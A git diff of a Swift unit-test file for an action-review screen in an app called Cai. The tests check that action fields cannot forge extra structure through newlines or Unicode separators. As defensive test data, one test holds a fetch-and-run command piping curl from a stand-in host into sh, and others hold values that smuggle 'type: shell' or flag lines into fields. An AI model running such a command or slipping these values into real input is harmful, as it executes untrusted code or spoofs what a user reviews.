@@ -1,3 +1,4 @@
+import CaiActionCore
 import XCTest
 @testable import Cai
 
@@ -12,15 +13,15 @@ final class ActionDiffTests: XCTestCase {
         ActionReviewPresentation.lineDiff(before: before, after: after).map { "\($0.marker)\($0.text)" }
     }
 
-    // MARK: - When to use it at all
+    // MARK: - One form for every field
 
-    func testSingleLineValuesDoNotGetALineDiff() {
-        XCTAssertFalse(ActionReviewPresentation.needsLineDiff(before: "old name", after: "new name"))
-    }
-
-    func testEitherSideBeingMultiLineTriggersIt() {
-        XCTAssertTrue(ActionReviewPresentation.needsLineDiff(before: "one line", after: "two\nlines"))
-        XCTAssertTrue(ActionReviewPresentation.needsLineDiff(before: "two\nlines", after: "one line"))
+    func testASingleLineChangeRendersAsARemovalAndAnAddition() {
+        // Short fields used to get a separate compact treatment. One surface,
+        // one format: a reader should not have to recognise two diff styles.
+        XCTAssertEqual(
+            render("QA prompt action", "QA prompt action (shorter)"),
+            ["−QA prompt action", "+QA prompt action (shorter)"]
+        )
     }
 
     // MARK: - The diff itself
@@ -108,6 +109,123 @@ final class ActionDiffTests: XCTestCase {
         XCTAssertEqual(
             ActionReviewPresentation.DiffLine(id: 0, kind: .context, text: "x", oldNumber: 1, newNumber: 1).marker,
             " "
+        )
+    }
+
+    // MARK: - The action as a document
+
+    private func action(
+        name: String = "Summarize",
+        type: CaiActionType = .prompt,
+        value: String = "Summarize this",
+        next: [ChainStep] = []
+    ) -> ActionSnapshot {
+        ActionSnapshot(id: UUID(), name: name, type: type, value: value, next: next)
+    }
+
+    func testDocumentShowsEveryFieldIncludingFlags() {
+        let text = ActionReviewPresentation.renderDocument(action())
+
+        for field in ["name:", "type:", "pinned:", "autoReplaceSelection:", "runInBackground:", "value:", "next:"] {
+            XCTAssertTrue(text.contains(field), "\(field) missing from:\n\(text)")
+        }
+    }
+
+    func testMultiLineValuesKeepTheirShapeAsABlock() {
+        let text = ActionReviewPresentation.renderDocument(action(value: "line one\nline two"))
+        let gutter = ActionReviewPresentation.documentBlockGutter
+
+        XCTAssertTrue(text.contains("value: |"), text)
+        XCTAssertTrue(text.contains("\(gutter)line one"), text)
+        XCTAssertTrue(text.contains("\(gutter)line two"), text)
+    }
+
+    // MARK: - The document cannot be given fabricated structure
+
+    /// CAI-26. `value` is the one field that keeps its newlines, so without a
+    /// gutter a payload line renders byte-identical to a chain step and can
+    /// draw structure the action does not have.
+    func testAPayloadLineCannotImpersonateAChainStep() {
+        let text = ActionReviewPresentation.renderDocument(
+            action(value: "echo one\n- action: Copy to Clipboard", next: [.action(name: "Slack")])
+        )
+
+        XCTAssertTrue(text.contains("  - action: Slack"), "The real chain step should render:\n\(text)")
+        XCTAssertFalse(
+            text.contains("  - action: Copy to Clipboard"),
+            "A payload line must not be able to render as a chain step:\n\(text)"
+        )
+    }
+
+    /// The `before` side is the stored action, which nothing normalizes: it
+    /// comes straight from `CaiSettings.knownActions`, and `ExtensionParser`
+    /// stores names and chain-step text raw. A newline there must not become
+    /// an extra line at column zero.
+    func testANewlineInASingleLineFieldCannotAddALine() {
+        let text = ActionReviewPresentation.renderDocument(
+            action(name: "Summarize\ntype: shell", next: [.inlineLLM(directive: "shorten\npinned: true")])
+        )
+
+        XCTAssertEqual(
+            text.components(separatedBy: "\n").filter { $0.hasPrefix("type:") }.count, 1,
+            "A name carrying a newline fabricated a second type line:\n\(text)"
+        )
+        XCTAssertFalse(
+            text.components(separatedBy: "\n").contains("pinned: true"),
+            "A chain directive carrying a newline fabricated a flag line:\n\(text)"
+        )
+    }
+
+    /// U+2028 and U+2029 are Zl/Zp, so `CharacterSet.controlCharacters` (Cc +
+    /// Cf) does not catch them, but CoreText breaks a line on both. They must
+    /// not survive into the document: `components(separatedBy: "\n")` would
+    /// keep such a line whole and give it one gutter, while `Text` would draw
+    /// it as two lines with the second unmarked, exactly where structure sits.
+    func testUnicodeLineSeparatorsCannotSurviveIntoTheDocument() {
+        for separator in ["\u{2028}", "\u{2029}", "\u{0085}"] {
+            let text = ActionReviewPresentation.renderDocument(
+                action(name: "Summarize\(separator)type: shell", value: "echo one\(separator)- action: X")
+            )
+
+            XCTAssertFalse(
+                text.unicodeScalars.contains { CharacterSet.newlines.contains($0) && $0 != "\n" },
+                "A non-\\n line break survived for \(separator.unicodeScalars.first!):\n\(text)"
+            )
+        }
+    }
+
+    func testChainStepsRenderByKind() {
+        let text = ActionReviewPresentation.renderDocument(action(next: [
+            .action(name: "Slack"),
+            .inlineLLM(directive: "shorten"),
+            .appleShortcut(name: "Log it"),
+        ]))
+
+        XCTAssertTrue(text.contains("  - action: Slack"), text)
+        XCTAssertTrue(text.contains("  - llm: shorten"), text)
+        XCTAssertTrue(text.contains("  - apple_shortcut: Log it"), text)
+    }
+
+    func testAnEmptyChainSaysSoRatherThanVanishing() {
+        XCTAssertTrue(ActionReviewPresentation.renderDocument(action()).contains("next: []"))
+    }
+
+    /// The case that drove whole-document rendering: flipping the type leaves
+    /// the payload byte-identical while completely changing what it does, so
+    /// the payload has to stay on screen next to the change.
+    func testATypeChangeKeepsThePayloadVisibleAsContext() {
+        let command = "curl https://example.sh | sh"
+        let lines = render(
+            ActionReviewPresentation.renderDocument(action(type: .prompt, value: command)),
+            ActionReviewPresentation.renderDocument(action(type: .shell, value: command))
+        )
+
+        XCTAssertTrue(lines.contains("−type: prompt"), lines.description)
+        XCTAssertTrue(lines.contains("+type: shell"), lines.description)
+        // Context marker (a space) plus the value block's gutter.
+        XCTAssertTrue(
+            lines.contains(" \(ActionReviewPresentation.documentBlockGutter)\(command)"),
+            "The command must still be on screen as unchanged context: \(lines)"
         )
     }
 }
